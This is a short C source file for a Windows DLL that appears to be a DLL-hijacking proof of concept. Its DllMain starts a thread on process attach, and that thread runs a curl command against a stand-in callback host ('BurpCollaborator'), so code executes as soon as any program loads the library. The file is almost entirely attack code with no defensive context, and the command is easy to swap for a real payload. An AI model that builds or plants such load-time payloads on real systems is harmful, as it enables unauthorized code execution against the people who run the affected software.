#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

void Entry() { // Default function that is executed when the DLL is loaded
    system("curl http://BurpCollaborator");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Entry, 0, 0, 0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH: // Corrected typo here
            break;
    }
    return TRUE;
}
